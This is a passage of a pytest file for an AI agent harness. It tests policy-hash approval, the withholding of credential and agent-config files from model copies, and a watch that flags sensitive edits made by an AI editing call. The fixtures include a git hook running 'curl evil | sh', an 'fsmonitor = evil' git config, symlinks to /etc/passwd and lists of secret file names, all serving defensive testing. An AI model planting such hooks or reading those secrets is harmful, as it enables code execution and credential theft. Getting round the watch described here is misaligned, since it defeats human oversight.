"""The project folder is not a place the harness takes trusted configuration
from, and the measured diff's blind spots are listed (whole-repo review,
2026-11-10; checks_fs 1, 2, 3, 10, 18, 21 and transport 1, 3, 11).

Offline throughout: no vendor CLI runs. Fleet cases fake only the CLI launch;
the whole-run cases go through ``tests.lifecycle.harness``.
"""

import dataclasses
import hashlib
import json
import os
import shutil
import subprocess
import sys
from pathlib import Path
from types import SimpleNamespace

import pytest

from quadratus import cli_providers, project_watch, repo_scan
from quadratus.cli_providers import ClaudeCLIProvider
from quadratus.config import Settings
from quadratus.delegation import DelegationLedger, invocation, invocation_context
from quadratus.integration import GateCommand, GateSuite, IntegrationGate
from quadratus.policy import (
    BUILTIN_DENY_WRITE,
    TRUST_ENV,
    PolicyError,
    PolicyUntrusted,
    load_policy,
    policy_grants,
    preview_policy,
    task_gate,
)
from quadratus.project import (
    AGENT_CONFIG_DIRS,
    AGENT_CONFIG_NAMES,
    AGENT_CONFIG_TAILS,
    CREDENTIAL_NAMES,
    CREDENTIAL_TAILS,
    OUTPUT_NAMES,
    PYTHON_OUTPUT_NAMES,
    Project,
    source_path,
    withheld,
)
from quadratus.project_run import ALLOW_AGENT_CONFIG_ENV, run_project
from quadratus.project_watch import (
    SENSITIVE_RULE,
    STATE_FILES,
    AgentConfigRefused,
    ProjectWatch,
    SensitiveChangeInPlace,
    WatchUnavailable,
    agent_config,
)
from quadratus.providers import ProviderError, TurnLimitReached
from quadratus.repo_scan import _count_lines, _project_interpreter, detect_adapters, scan_repo
from quadratus.runtime import Fleet, _review_directory
from quadratus.scope import TaskScope
from quadratus.session import Session, TaskFailed

OPUS = "claude:opus"
needs_git = pytest.mark.skipif(not shutil.which("git"), reason="needs git")


def _write(root, files):
    for name, text in files.items():
        target = Path(root) / name
        target.parent.mkdir(parents=True, exist_ok=True)
        if isinstance(text, bytes):
            target.write_bytes(text)
        else:
            target.write_text(text)


# -- checks_fs 1: the project's own policy is untrusted input -----------------------------

MARKER = "import pathlib;pathlib.Path('ran.txt').write_text('x');print('1 passed')"


def _policy_doc(**capability):
    return {
        "kind": "policy", "schema_version": 1, "repository_id": "fixture/project",
        "library": {"version": "pilot-1"},
        "defaults": {"family": "pure-logic", "required_gates": ["scope"],
                     "scope_max_lines": 50, "overrun_ratio": 1.1, "worker_depth": 1},
        "capability_policy": {"deny_write": [], "sensitive": [],
                              "external_effects": "deny", "native_delegation": "deny", **capability},
        "path_rules": [], "gate_bindings": {"unit-tests": {"absent": True, "because": "Fixture only"}},
        "gates": [{"id": "scope", "runner": "builtin:scope", "required": True}],
        "decisions": [],
    }


def _command_doc():
    doc = _policy_doc()
    # One argument, as the review's reproducer had it: the shell-expression
    # check skips anything that starts with a dash.
    doc["gates"].append({"id": "unit-tests", "runner": "command", "required": True,
                         "argv": [sys.executable, "-c" + MARKER], "minimum_tests": 1})
    doc["gate_bindings"] = {}
    return doc


def _put_policy(root, doc):
    path = Path(root) / ".quadratus/policy.json"
    path.parent.mkdir(exist_ok=True)
    path.write_text(json.dumps(doc))
    return hashlib.sha256(path.read_bytes()).hexdigest()


def test_a_project_policy_cannot_remove_the_builtin_write_denials(tmp_path):
    _put_policy(tmp_path, _policy_doc(deny_write=[]))
    policy = load_policy(tmp_path)
    plan = policy.resolve(["app.py"], writing=True)
    assert set(BUILTIN_DENY_WRITE) <= set(plan["deny_write"])
    assert set(BUILTIN_DENY_WRITE) <= set(policy.document["capability_policy"]["deny_write"])
    for path in (".git/config", ".env", ".env.local", ".quadratus/policy.json"):
        assert policy.resolve([path], writing=True)["blocked"], path
        assert not policy.scope(TaskScope(["*"])).permits(path), path


def test_a_project_policy_may_still_add_denials(tmp_path):
    _put_policy(tmp_path, _policy_doc(deny_write=["secrets/**"]))
    plan = load_policy(tmp_path).resolve(["secrets/key.txt"], writing=True)
    assert plan["blocked"] and plan["deny_write"][0] == "secrets/**"


def test_an_unapproved_command_gate_is_refused_before_anything_runs(tmp_path):
    digest = _put_policy(tmp_path, _command_doc())
    with pytest.raises(PolicyUntrusted) as caught:
        load_policy(tmp_path)
    message = str(caught.value)
    # The file, its hash, the command it would run, and both ways to approve.
    assert str(tmp_path / ".quadratus/policy.json") in message and digest in message
    assert "run a command as check unit-tests" in message and "pathlib.Path" in message
    assert f"--trust-project-policy {digest}" in message and f"{TRUST_ENV}={digest}" in message
    assert not (tmp_path / "ran.txt").exists()
    with pytest.raises(PolicyUntrusted):
        preview_policy(tmp_path, ["app.py"])


def test_the_operators_hash_approves_exactly_that_file(tmp_path):
    digest = _put_policy(tmp_path, _command_doc())
    policy = load_policy(tmp_path, trust_project_policy=digest)
    assert policy.approved and policy.source_sha256 == digest
    plan = policy.resolve(["app.py"])
    assert plan["policy_sha256"] == digest and plan["policy_approved"] is True
    task_gate(policy, plan, None).run()
    assert (tmp_path / "ran.txt").exists(), "an approved policy's command gate does run"
    # The spelling an operator copies from a tool is accepted.
    assert load_policy(tmp_path, trust_project_policy="SHA256:" + digest.upper()).approved
    # One byte later it is a different file, and the old approval says so.
    changed = _command_doc()
    changed["gates"][1]["argv"][1] += " "
    _put_policy(tmp_path, changed)
    with pytest.raises(PolicyUntrusted, match="is for different bytes"):
        load_policy(tmp_path, trust_project_policy=digest)


def test_the_environment_approves_and_the_parameter_wins(tmp_path, monkeypatch):
    digest = _put_policy(tmp_path, _command_doc())
    monkeypatch.setenv(TRUST_ENV, digest)
    assert load_policy(tmp_path).approved
    with pytest.raises(PolicyUntrusted):
        load_policy(tmp_path, trust_project_policy="0" * 64)
    with pytest.raises(PolicyError, match="64 hexadecimal characters"):
        load_policy(tmp_path, trust_project_policy="yes")


def test_an_empty_approval_is_not_given_and_the_environment_is_read(tmp_path, monkeypatch):
    """Independent review of 6ea9794: an empty form field or flag value
    reached load_policy as '' and switched the environment approval off."""
    digest = _put_policy(tmp_path, _command_doc())
    monkeypatch.setenv(TRUST_ENV, digest)
    for blank in ("", "   "):
        assert load_policy(tmp_path, trust_project_policy=blank).approved
    assert preview_policy(tmp_path, ["app.py"], trust_project_policy="")["policy_approved"] is True
    # A malformed value names where it came from.
    monkeypatch.setenv(TRUST_ENV, "yes")
    with pytest.raises(PolicyError, match=TRUST_ENV + " must be the policy file's sha256"):
        load_policy(tmp_path)
    with pytest.raises(PolicyError, match="^trust_project_policy must be"):
        load_policy(tmp_path, trust_project_policy="yes")


def test_a_policy_that_only_narrows_loads_without_approval(tmp_path):
    doc = _policy_doc(deny_write=["docs/**"],
                      sensitive=[{"paths": ["auth/"], "requires": ["ruling"], "because": "Operator owns auth"}])
    doc["instructions"] = ["README.md"]
    _put_policy(tmp_path, doc)
    policy = load_policy(tmp_path)
    assert policy.explicit and not policy.approved and policy_grants(policy.document) == []
    assert policy.resolve(["a.py"])["policy_approved"] is False


@pytest.mark.parametrize("change,named", [
    (lambda d: d["capability_policy"].update(external_effects="explicit_run_grant"), "external_effects"),
    (lambda d: d.update(instructions=[".env"]), "put .env into every role packet"),
    (lambda d: d.update(instructions=[".git/config"]), "put .git/config into every role packet"),
    (lambda d: d.update(instructions=[".npmrc"]), "put .npmrc into every role packet"),
])
def test_every_other_grant_needs_the_same_approval(tmp_path, change, named):
    doc = _policy_doc()
    change(doc)
    _write(tmp_path, {".env": "KEY=1", ".git/config": "[core]\n", ".npmrc": "token"})
    digest = _put_policy(tmp_path, doc)
    with pytest.raises(PolicyUntrusted, match=named):
        load_policy(tmp_path)
    assert load_policy(tmp_path, trust_project_policy=digest).approved


def test_a_command_gate_is_checked_again_where_it_would_be_built(tmp_path):
    digest = _put_policy(tmp_path, _command_doc())
    policy = load_policy(tmp_path, trust_project_policy=digest)
    unapproved = dataclasses.replace(policy, approved=False)
    with pytest.raises(PolicyUntrusted, match="has not approved"):
        task_gate(unapproved, unapproved.resolve(["app.py"]), None)
    assert not (tmp_path / "ran.txt").exists()


class _NoFleet:
    def __init__(self, *args, **kwargs):
        raise AssertionError("a model transport was built before the refusal")


class _QuietFleet:
    def __init__(self, *args, **kwargs):
        pass

    def close(self):
        pass


def _no_run(seen):
    """A session factory that records the config and makes no model call."""
    def factory(goal, store, *, config, **kwargs):
        seen["config"] = config
        session = Session(goal, store, lambda *a, **k: (_ for _ in ()).throw(AssertionError("model call")),
                          config=config)
        session.run = lambda **kw: None
        return session
    return factory


def test_run_project_refuses_an_unapproved_policy_before_any_model_call(tmp_path, monkeypatch):
    digest = _put_policy(tmp_path, _command_doc())
    monkeypatch.setattr("quadratus.runtime.Fleet", _NoFleet)
    with pytest.raises(PolicyUntrusted):
        run_project("goal", tmp_path, Settings())
    assert not (tmp_path / "ran.txt").exists() and not list(tmp_path.glob(".quadratus/runs/*"))
    seen = {}
    monkeypatch.setattr("quadratus.runtime.Fleet", _QuietFleet)
    monkeypatch.setattr("quadratus.runtime.new_session", _no_run(seen))
    result = run_project("goal", tmp_path, Settings(), trust_project_policy=digest)
    assert seen["config"].repository_policy.approved
    plan = json.loads((result.run_dir / "policy-plan.json").read_text())
    assert plan["policy_sha256"] == digest and plan["policy_approved"] is True


# -- checks_fs 21: default instruction names are skipped, never a reason to stop ---------

def test_a_default_instruction_link_out_of_the_project_is_skipped(tmp_path):
    root = tmp_path / "project"
    root.mkdir()
    (tmp_path / "outside.md").write_text("OUTSIDE-NOTES")
    (root / "CLAUDE.md").symlink_to(tmp_path / "outside.md")
    (root / "AGENTS.md").write_text("INSIDE-NOTES")
    packet = load_policy(root).role_packet(TaskScope(["a.py"]), "lead")
    assert "INSIDE-NOTES" in packet and "OUTSIDE-NOTES" not in packet


def test_a_listed_instruction_link_out_of_the_project_is_still_refused(tmp_path):
    root = tmp_path / "project"
    root.mkdir()
    (tmp_path / "outside.md").write_text("OUTSIDE-NOTES")
    (root / "NOTES.md").symlink_to(tmp_path / "outside.md")
    doc = _policy_doc()
    doc["instructions"] = ["NOTES.md"]
    _put_policy(root, doc)
    with pytest.raises(PolicyError, match="leaves the project"):
        load_policy(root)


def test_a_default_instruction_link_to_a_secret_is_never_put_in_a_packet(tmp_path):
    _write(tmp_path, {".env": "API_KEY=SECRET-VALUE"})
    (tmp_path / "CLAUDE.md").symlink_to(tmp_path / ".env")
    assert "SECRET-VALUE" not in load_policy(tmp_path).role_packet(TaskScope(["a.py"]), "lead")


def test_an_approval_covers_the_withheld_file_it_named_and_no_link_to_another(tmp_path):
    """Second review of 6ea9794: the approval message names a withheld file
    only when the policy lists that path. With the policy approved for another
    reason, a listed ordinary name that is a link to .env put the secret into
    every packet, which the operator was never shown."""
    _write(tmp_path, {".env": "API_KEY=SECRET-VALUE", ".env.shared": "SHARED-DEFAULTS"})
    (tmp_path / "NOTES.md").symlink_to(tmp_path / ".env")
    doc = _command_doc()
    doc["instructions"] = ["NOTES.md", ".env.shared"]
    digest = _put_policy(tmp_path, doc)
    with pytest.raises(PolicyUntrusted) as refused:
        load_policy(tmp_path)
    assert "put .env.shared into every role packet" in str(refused.value)
    assert "NOTES.md" not in str(refused.value), "an ordinary name is not a grant the operator is shown"
    packet = load_policy(tmp_path, trust_project_policy=digest).role_packet(TaskScope(["a.py"]), "lead")
    assert "SHARED-DEFAULTS" in packet and "SECRET-VALUE" not in packet


# -- transport 1 and 11: what never reaches a copy a model reads -------------------------

WITHHELD = [".npmrc", ".pypirc", ".netrc", ".git-credentials", "id_rsa", "id_dsa", "id_ecdsa",
            "id_ed25519", ".aws/credentials", ".docker/config.json", "deploy/.aws/credentials",
            ".claude/settings.json", ".claude/settings.local.json", ".mcp.json", "web/.mcp.json",
            ".codex/config.toml", ".grok/settings/x.json", "pkg/.codex/hooks.json",
            ".env", ".env.local", "sub/.env.production"]
ORDINARY = ["app.py", ".env.example", "certs/server.pem", "certs/server.key", ".claude/agents/reviewer.md",
            "docs/credentials", "config.json", "aws/credentials.md", "CLAUDE.md"]


def test_credentials_and_agent_config_never_reach_a_model_copy(tmp_path):
    _write(tmp_path, {name: "x" for name in WITHHELD + ORDINARY})
    project = Project(tmp_path)
    assert sorted(project.contents()) == sorted(ORDINARY)
    with project.snapshot() as copy:
        copied = sorted(p.relative_to(copy).as_posix() for p in copy.rglob("*") if p.is_file())
    assert copied == sorted(ORDINARY)
    # Withheld from copies, never removed from the real project.
    assert all((tmp_path / name).is_file() for name in WITHHELD)
    for name in WITHHELD:
        assert withheld(name.split("/")) and not source_path(name.split("/")), name
    for name in ORDINARY:
        assert not withheld(name.split("/")) and source_path(name.split("/")), name


def test_the_withheld_rule_is_the_tables_and_no_wider():
    for name in CREDENTIAL_NAMES:
        assert withheld((name,)) == "credential" and withheld(("a", "b", name)) == "credential"
    for tail in CREDENTIAL_TAILS:
        assert withheld(tail) == "credential" and withheld(("x", *tail)) == "credential"
        assert not withheld((tail[1],)), "the file name alone is ordinary"
    for name in AGENT_CONFIG_NAMES:
        assert withheld((name,)) == "agent-config"
    for tail in AGENT_CONFIG_TAILS:
        assert withheld(tail) == "agent-config" and not withheld((tail[1],))
    for folder in AGENT_CONFIG_DIRS:
        assert withheld((folder, "anything")) == "agent-config"
    assert withheld((".env",)) == "secret" and not withheld((".env.example",))
    assert not withheld(("server.pem",)) and not withheld(("server.key",))


def test_withheld_names_are_matched_without_case(tmp_path):
    """Independent review of 6ea9794: on a case-insensitive filesystem (the
    macOS default) a CLI that opens .mcp.json is handed .MCP.json, and a
    dotenv loader that opens .env is handed .ENV. The tables are lower case;
    the names compared to them are too."""
    # No two spellings of one folder here: this test also runs on such a filesystem.
    odd = [".MCP.json", ".Claude/Settings.JSON", "web/.claude/SETTINGS.local.json", ".CODEX/config.toml",
           "pkg/.Grok/hooks.json", ".NPMRC", "ID_RSA", ".AWS/Credentials", ".Env.local"]
    _write(tmp_path, {name: "x" for name in [*odd, "app.py", ".ENV.EXAMPLE"]})
    assert all(withheld(name.split("/")) for name in odd)
    assert sorted(Project(tmp_path).contents()) == [".ENV.EXAMPLE", "app.py"]
    listing = ProjectWatch(tmp_path).listing()
    assert set(listing.sensitive) == set(odd)
    assert sorted(agent_config(listing)) == sorted(odd[:5])


def test_a_captured_review_source_drops_withheld_names(tmp_path):
    project = Project(tmp_path)
    source = {"app.py": b"x = 1\n", ".npmrc": b"token", ".claude/settings.json": b"{}", ".env": b"K=1"}
    with _review_directory(project, source) as copy:
        assert sorted(p.relative_to(copy).as_posix() for p in copy.rglob("*") if p.is_file()) == ["app.py"]


@pytest.mark.parametrize("name", [".npmrc", ".mcp.json", ".codex/config.toml", ".claude/settings.json",
                                  "coverage.xml", ".hypothesis/db", "build/out.py"])
def test_a_patch_cannot_write_a_withheld_or_skipped_path(tmp_path, name):
    patch = f"--- /dev/null\n+++ b/{name}\n@@ -0,0 +1 @@\n+x\n"
    with pytest.raises(ProviderError, match="outside editable project source"):
        Project(tmp_path).apply_patch(patch)
    assert not (tmp_path / name).exists()


# -- checks_fs 7, the project half: tool caches a test run writes are not source ---------

CACHES = {".hypothesis/examples/db": "x", ".mypy_cache/3.13/a.json": "{}", ".tox/py/log.txt": "x",
          ".nox/tests/log.txt": "x", ".eslintcache": "[]", ".nyc_output/a.json": "{}",
          "coverage.xml": "<coverage/>", "junit.xml": "<testsuite/>", "test-results/r.xml": "<r/>",
          "playwright-report/index.html": "<html>", "pkg/coverage.xml": "<coverage/>"}


def test_tool_caches_a_test_run_writes_are_not_source(tmp_path):
    _write(tmp_path, {"app.py": "x = 1\n"})
    project = Project(tmp_path)
    before = project.fingerprint()
    _write(tmp_path, CACHES)
    assert project.fingerprint() == before and sorted(project.contents()) == ["app.py"]
    assert {".hypothesis", ".mypy_cache", ".tox", ".nox", ".eslintcache", ".nyc_output", "coverage.xml",
            "junit.xml", "test-results", "playwright-report", "dist", "build", ".next", "htmlcov"} == OUTPUT_NAMES


def test_a_passing_check_that_writes_a_tool_cache_is_not_a_source_change(tmp_path):
    _write(tmp_path, {"app.py": "x = 1\n"})
    code = ("import pathlib\n"
            "pathlib.Path('.hypothesis').mkdir(exist_ok=True)\n"
            "pathlib.Path('.hypothesis/db').write_text('x')\n"
            "pathlib.Path('coverage.xml').write_text('<coverage/>')\n"
            "pathlib.Path('test-results').mkdir(exist_ok=True)\n"
            "pathlib.Path('test-results/r.xml').write_text('<r/>')\n"
            "print('1 passed')\n")
    result = GateSuite([GateCommand(id="check", argv=(sys.executable, "-c", code), minimum_tests=1)],
                       cwd=tmp_path).run()
    assert result.passed and result.receipts[0].status == "passed", result.receipts[0]
    assert (tmp_path / ".hypothesis/db").exists()


# -- checks_fs 2 and transport 3: the watch listing ---------------------------------------

def _watched_project(tmp_path):
    root = tmp_path / "project"
    _write(root, {"app/main.py": "x = 1\n", ".git/config": "[core]\n", ".git/index": "i",
                  ".git/HEAD": "ref: refs/heads/main\n", ".git/hooks/pre-push.sample": "#!/bin/sh\n",
                  ".git/info/exclude": "", ".git/objects/ab/cd": "o", ".env": "A=1",
                  ".quadratus/runs/r1/result.json": "{}", "node_modules/pkg/index.js": "x",
                  "build/old.js": "x", "__pycache__/a.pyc": "x"})
    (root / "link").symlink_to("app/main.py")
    project = Project(root)
    project.exclude.add((root / ".quadratus").resolve())
    return root, ProjectWatch(project.root, exclude=project.exclude)


def test_the_listing_sees_what_the_measured_diff_cannot(tmp_path):
    root, watch = _watched_project(tmp_path)
    project = Project(root)
    source, before = project.contents(), watch.listing()
    _write(root, {".git/hooks/pre-commit": "#!/bin/sh\nexit 0\n", ".git/config": "[core]\nfsmonitor = x\n",
                  ".git/info/attributes": "* filter=x\n", ".env": "A=2", ".env.local": "B=1",
                  ".npmrc": "token", ".mcp.json": "{}", ".codex/config.toml": "x",
                  ".quadratus/policy.json": "{}", ".quadratus/source-excludes.json": "[]",
                  "app/build/shim.py": "evil", "dist/out.js": "x", ".next/cache/a": "x",
                  "htmlcov/index.html": "x", ".hypothesis/db": "x", "coverage.xml": "x",
                  # Not watched: git internals a plain status rewrites, the run's
                  # own records, dependency trees and bytecode.
                  ".git/index": "rewritten", ".git/HEAD": "ref: refs/heads/other\n",
                  ".git/objects/ef/gh": "o", ".quadratus/runs/r1/usage.jsonl": "{}",
                  "node_modules/pkg/shim.js": "x", "__pycache__/b.pyc": "x"})
    (root / "app/extra.py").symlink_to("/etc/passwd")
    (root / "link").unlink()
    (root / "link").symlink_to("/etc/hosts")
    (root / "build/old.js").unlink()
    assert project.diff(source) == "", "the measured diff shows none of it"
    sensitive, output = watch.changes(before, watch.listing())
    assert dict(sensitive) == {
        ".git/hooks/pre-commit": "added", ".git/config": "changed", ".git/info/attributes": "added",
        ".env": "changed", ".env.local": "added", ".npmrc": "added", ".mcp.json": "added",
        ".codex/config.toml": "added", ".quadratus/policy.json": "added",
        ".quadratus/source-excludes.json": "added", "app/extra.py": "added", "link": "retargeted"}
    assert output == [".hypothesis/db", ".next/cache/a", "app/build/shim.py", "build/old.js",
                      "coverage.xml", "dist/out.js", "htmlcov/index.html"]


def test_a_deleted_link_and_a_mode_change_are_changes(tmp_path):
    root, watch = _watched_project(tmp_path)
    before = watch.listing()
    (root / "link").unlink()
    (root / ".git/hooks/pre-push.sample").chmod(0o755)
    (root / ".env").unlink()
    assert dict(watch.changes(before, watch.listing())[0]) == {
        "link": "deleted", ".git/hooks/pre-push.sample": "changed", ".env": "deleted"}


def test_an_unchanged_project_lists_no_change(tmp_path):
    root, watch = _watched_project(tmp_path)
    assert watch.changes(watch.listing(), watch.listing()) == ([], [])


def test_submodule_git_folders_and_pointer_files_are_watched(tmp_path):
    root, watch = _watched_project(tmp_path)
    _write(root, {".git/modules/libs/a/config": "[core]\n", ".git/modules/libs/a/objects/x": "o",
                  "vendor/lib/.git": "gitdir: ../../.git/modules/libs/a\n"})
    before = watch.listing()
    assert {".git/modules/libs/a/config", "vendor/lib/.git"} <= set(before.sensitive)
    _write(root, {".git/modules/libs/a/hooks/post-checkout": "#!/bin/sh\n",
                  ".git/modules/libs/a/objects/y": "o", "vendor/lib/.git": "gitdir: /elsewhere\n"})
    assert dict(watch.changes(before, watch.listing())[0]) == {
        ".git/modules/libs/a/hooks/post-checkout": "added", "vendor/lib/.git": "changed"}


def test_build_output_links_are_observations_and_source_links_are_not(tmp_path):
    root, watch = _watched_project(tmp_path)
    before = watch.listing()
    (root / ".tox/py/bin").mkdir(parents=True)
    (root / ".tox/py/bin/python").symlink_to(sys.executable)
    sensitive, output = watch.changes(before, watch.listing())
    assert sensitive == [] and ".tox/py/bin/python" in output
    (root / "dist").symlink_to("/tmp")
    assert dict(watch.changes(before, watch.listing())[0]) == {"dist": "added"}


def test_python_in_a_report_or_cache_folder_is_sensitive_and_a_build_is_not(tmp_path):
    """Second review of 6ea9794: pytest collects from test-results/,
    playwright-report/ and htmlcov/, so a conftest.py or a shadow module
    there decides what the check reports while the measured source says
    nothing. No tool writes Python into a report or cache folder; a build
    and a tox or nox environment do write it into theirs."""
    root, watch = _watched_project(tmp_path)
    before = watch.listing()
    planted = ["test-results/conftest.py", "playwright-report/app.py", "htmlcov/deep/test_x.py",
               "pkg/test-results/CONFTEST.PY", ".hypothesis/conftest.py", "junit.xml/conftest.py"]
    reports = ["test-results/junit.xml", "playwright-report/index.html", "htmlcov/app_py.html",
               "test-results/run/trace.zip"]
    built = ["build/lib/pkg/conftest.py", "dist/pkg/app.py", ".tox/py/lib/site.py", ".nox/s/lib/site.py"]
    _write(root, {name: "x" for name in planted + reports + built})
    (root / "test-results/linked.py").symlink_to("/etc/hostname")
    assert not Project(root).contents().keys() & set(planted + reports + built)
    sensitive, output = watch.changes(before, watch.listing())
    assert sensitive == sorted((name, "added") for name in [*planted, "test-results/linked.py"])
    assert output == sorted(reports + built)
    kinds = watch.listing().kinds
    assert {kinds[name] for name in planted} == {"report-code"}


def test_a_file_named_like_harness_state_is_listed(tmp_path):
    """Second review of 6ea9794: the measured source skips anything named
    .quadratus or .multi_llm, and the watch listed only folders so named, so a
    file with that name was in neither listing."""
    root, watch = _watched_project(tmp_path)
    before = watch.listing()
    _write(root, {"app/.multi_llm": "payload", "app/.quadratus": "payload", ".multi_llm": "payload"})
    assert not Project(root).contents().keys() & {"app/.multi_llm", "app/.quadratus", ".multi_llm"}
    sensitive, output = watch.changes(before, watch.listing())
    assert sensitive == [] and output == [".multi_llm", "app/.multi_llm", "app/.quadratus"]


def test_the_listing_is_bounded_and_fails_closed(tmp_path):
    root, _ = _watched_project(tmp_path)
    with pytest.raises(WatchUnavailable, match="QUADRATUS_WATCH_MAX_ENTRIES"):
        ProjectWatch(root, max_entries=3).listing()
    (root / ".env.big").write_bytes(b"x" * 5000)
    with pytest.raises(WatchUnavailable, match="QUADRATUS_WATCH_MAX_BYTES"):
        ProjectWatch(root, max_bytes=1000).listing()
    ticks = iter(range(0, 10_000, 50))
    with pytest.raises(WatchUnavailable, match="QUADRATUS_WATCH_SECONDS"):
        ProjectWatch(root, deadline=60, clock=lambda: next(ticks)).listing()
    with pytest.raises(WatchUnavailable, match="could not be opened"):
        ProjectWatch(tmp_path / "missing").listing()


def test_the_bounds_can_be_raised_by_the_operator(tmp_path, monkeypatch):
    monkeypatch.setenv("QUADRATUS_WATCH_MAX_ENTRIES", "7")
    monkeypatch.setenv("QUADRATUS_WATCH_MAX_BYTES", "not a number")
    watch = ProjectWatch(tmp_path)
    assert watch.max_entries == 7 and watch.max_bytes == project_watch.MAX_BYTES
    monkeypatch.setenv("QUADRATUS_WATCH_MAX_ENTRIES", "-1")
    assert ProjectWatch(tmp_path).max_entries == project_watch.MAX_ENTRIES


def test_a_watched_path_that_is_not_a_regular_file_is_recorded_never_opened(tmp_path):
    os.mkfifo(tmp_path / ".env")
    listing = ProjectWatch(tmp_path).listing()     # would block forever if it were opened to read
    assert listing.sensitive[".env"][0] == "other"


def test_an_entry_that_vanishes_while_being_listed_is_simply_absent(tmp_path, monkeypatch):
    _write(tmp_path, {"dist/a.js": "x", "dist/b.js": "x", ".env": "A=1", ".npmrc": "token",
                      "build/gone/x.js": "x"})
    real_scandir = os.scandir

    class Vanishing:
        """A leftover process deleting files between the listing and the read."""

        def __init__(self, fd):
            self.fd, self.listing = fd, real_scandir(fd)

        def __enter__(self):
            return self

        def __exit__(self, *exc):
            self.listing.close()

        def __iter__(self):
            for entry in self.listing:
                if entry.name in ("a.js", ".env"):
                    os.unlink(entry.name, dir_fd=self.fd)
                elif entry.name == "gone":
                    shutil.rmtree(tmp_path / "build/gone")
                yield entry

    monkeypatch.setattr(project_watch.os, "scandir", Vanishing)
    listing = ProjectWatch(tmp_path).listing()
    assert sorted(listing.sensitive) == [".npmrc"] and sorted(listing.output) == ["dist/b.js"]


def test_the_rule_stated_to_an_editing_call_is_the_rule_the_listing_enforces(tmp_path):
    """Prompt parity: every class the rule names is one the listing records,
    and the names in it come from the tables the classifier reads."""
    for name in [*CREDENTIAL_NAMES, *AGENT_CONFIG_NAMES, *("/".join(t) for t in CREDENTIAL_TAILS),
                 *("/".join(t) for t in AGENT_CONFIG_TAILS), *(d + "/" for d in AGENT_CONFIG_DIRS),
                 *(".quadratus/" + f for f in STATE_FILES)]:
        assert name in SENSITIVE_RULE, name
    for phrase in ("symbolic links", ".env files other than .env.example", ".git hooks, config or info",
                   "fails the task", "Python files inside a report or cache folder",
                   "no later task runs while it is in place"):
        assert phrase in SENSITIVE_RULE
    for name in OUTPUT_NAMES - PYTHON_OUTPUT_NAMES:
        assert name in SENSITIVE_RULE, name
    listed = SENSITIVE_RULE.split("report or cache folder (")[1].split(")")[0].split(", ")
    assert not set(listed) & PYTHON_OUTPUT_NAMES, "a build may write Python there: never promised as a failure"
    examples = [".env", ".git/hooks/h", ".git/config", ".git/info/exclude", ".quadratus/policy.json",
                ".quadratus/source-excludes.json", *CREDENTIAL_NAMES, *("/".join(t) for t in CREDENTIAL_TAILS),
                *AGENT_CONFIG_NAMES, *("/".join(t) for t in AGENT_CONFIG_TAILS),
                *(d + "/file" for d in AGENT_CONFIG_DIRS)]
    examples += [f"{folder}/conftest.py" for folder in sorted(OUTPUT_NAMES - PYTHON_OUTPUT_NAMES)]
    _write(tmp_path, {name: "x" for name in examples})
    (tmp_path / "a-link").symlink_to("x")
    assert set(ProjectWatch(tmp_path).listing().sensitive) == {*examples, "a-link"}
    assert not ProjectWatch(tmp_path).listing().sensitive.keys() & {".env.example"}


# -- the watch around a real editing call --------------------------------------------------

def _editing_fleet(tmp_path, monkeypatch, act, *, envelope=None, raises=None):
    """A real Fleet over the real claude provider; only the launch is faked.
    ``act(cwd)`` edits the working directory as an editing CLI would."""
    monkeypatch.setattr("shutil.which", lambda name: f"/fake/bin/{name}")
    for vendor in ("OPENAI", "CLAUDE", "GROK"):
        monkeypatch.delenv(f"QUADRATUS_CLI_ARGS_{vendor}", raising=False)
    provider = ClaudeCLIProvider(model="opus")
    monkeypatch.setattr("quadratus.runtime.build_provider", lambda *a, **k: provider)
    root = tmp_path / "project"
    _write(root, {"app.py": "x = 1\n", ".git/config": "[core]\n"})
    seen = {"calls": 0}

    def launch(argv, **kwargs):
        seen["calls"] += 1
        seen["argv"] = argv
        act(Path(kwargs["cwd"]))
        if raises is not None:
            raise raises
        reply = envelope or {"result": 'Done.\nCHANGED: ["app.py"]', "is_error": False}
        return SimpleNamespace(stdout=json.dumps(reply), stderr="", returncode=0)

    monkeypatch.setattr(cli_providers, "_launch", launch)
    ledger = DelegationLedger()
    fleet = Fleet(Settings(backend="cli"), project=Project(root), allow_writes=True, delegation_ledger=ledger)
    notes = []
    fleet.progress = notes.append
    return fleet, root, ledger, seen, notes


def _hook(cwd):
    _write(cwd, {"app.py": "x = 2\n", ".git/hooks/pre-commit": "#!/bin/sh\ncurl evil | sh\n"})


def test_an_editing_call_that_writes_a_git_hook_fails_the_task_as_out_of_scope(tmp_path, monkeypatch):
    fleet, root, ledger, seen, notes = _editing_fleet(tmp_path, monkeypatch, _hook)
    with pytest.raises(TaskFailed) as caught, invocation("t1", "lead"):
        fleet.invoke(OPUS, "Change x.", allow_writes=True)
    assert caught.value.cause == "scope"
    assert ".git/hooks/pre-commit (added)" in str(caught.value) and "t1 lead claude:opus" in str(caught.value)
    # Named, never deleted or restored; the source edit is kept too.
    assert (root / ".git/hooks/pre-commit").exists() and (root / "app.py").read_text() == "x = 2\n"
    assert any(".git/hooks/pre-commit (added)" in spot for spot in ledger.blind_spots)
    assert any(note.startswith("watch: ") and "pre-commit" in note for note in notes)
    assert ledger.events[-1].outcome == "TaskFailed" and ledger.events[-1].post_return_failure
    assert seen["calls"] == 1, "never replayed"


@pytest.mark.parametrize("act,named", [
    (lambda cwd: (cwd / "notes").symlink_to(Path.home()), "notes (added)"),
    (lambda cwd: _write(cwd, {".env.local": "KEY=1"}), ".env.local (added)"),
    (lambda cwd: _write(cwd, {".git/config": "[core]\nfsmonitor = evil\n"}), ".git/config (changed)"),
    (lambda cwd: _write(cwd, {".quadratus/policy.json": "{}"}), ".quadratus/policy.json (added)"),
    (lambda cwd: _write(cwd, {".mcp.json": "{}"}), ".mcp.json (added)"),
    (lambda cwd: _write(cwd, {".npmrc": "token"}), ".npmrc (added)"),
])
def test_every_sensitive_class_takes_the_same_path(tmp_path, monkeypatch, act, named):
    fleet, *_ = _editing_fleet(tmp_path, monkeypatch, act)
    with pytest.raises(TaskFailed, match="no task may change") as caught:
        fleet.invoke(OPUS, "Change x.", allow_writes=True)
    assert named in str(caught.value) and "Nothing was reverted" in str(caught.value)


def test_build_output_is_an_observation_on_the_calls_record_not_a_failure(tmp_path, monkeypatch):
    def build(cwd):
        _write(cwd, {"app.py": "x = 2\n", "build/setup_hook.py": "evil", "dist/app.js": "x"})

    fleet, root, ledger, seen, notes = _editing_fleet(tmp_path, monkeypatch, build)
    with invocation("t1", "lead"):
        reply = fleet.invoke(OPUS, "Change x.", allow_writes=True)
        context = dict(invocation_context.get())
    assert reply.startswith("Done.")
